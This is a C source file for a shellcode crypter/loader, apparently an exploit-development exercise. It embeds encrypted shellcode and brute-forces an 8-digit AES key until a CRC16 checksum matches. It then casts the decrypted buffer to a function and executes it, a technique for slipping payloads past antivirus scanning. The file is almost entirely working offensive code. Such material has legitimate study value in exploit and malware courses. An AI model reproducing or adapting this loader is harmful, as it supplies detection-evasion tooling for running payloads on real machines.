#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>
#include <math.h>
#include <stdint.h>
#include <stdlib.h>

char encryptedShellcode[] = \
"\xc1\x11\x8a\x10\xb1\xa8\x95\xd9\x75\x1c\xd3\x64\xad\xfd\x75\xee\xdb\x23\xdf\x9d\x8e\xbc\x20\x07\xa6\xaf\x75\x84\x24\xfd\xa0\xa8";

int decrypt(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}
  
  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  
  return 0;
}

unsigned short crc16(unsigned char data_p[], unsigned char length){
    unsigned char x;
    unsigned short crc = 0xFFFF;

    while (length--){
        x = crc >> 8 ^ *data_p++;
        x ^= x>>4;
        crc = (crc << 8) ^ ((unsigned short)(x << 12)) ^ ((unsigned short)(x <<5)) ^ ((unsigned short)x);
    }
    return crc;
}

int main(int argc, char *argv[])
{
  MCRYPT td, td2;
  char* IV   = "AAAAAAAAAAAAAAAA";
  char key[] = "13370000";
  int keysize = 8; /* 128 bits */
  char* buffer;
  int buffer_len = 32;
  unsigned short csum = 0;

  buffer = calloc(1, buffer_len);
  strncpy(buffer, encryptedShellcode, buffer_len);

  while (csum != 0x542c) {
    int c;
    int i = 7;
    key[i]++;
    for (i = 7; i > 0; i--) {
      if (key[i]-1 == '9') {
        key[i] = '0';
        key[i-1]++;
      }
    }
    strncpy(buffer, encryptedShellcode, buffer_len);
    decrypt(buffer, buffer_len, IV, key, keysize);
    csum = crc16(buffer, buffer_len);
  }

  int (*ret)() = (int(*)())buffer;
  ret();

  return 0;
}
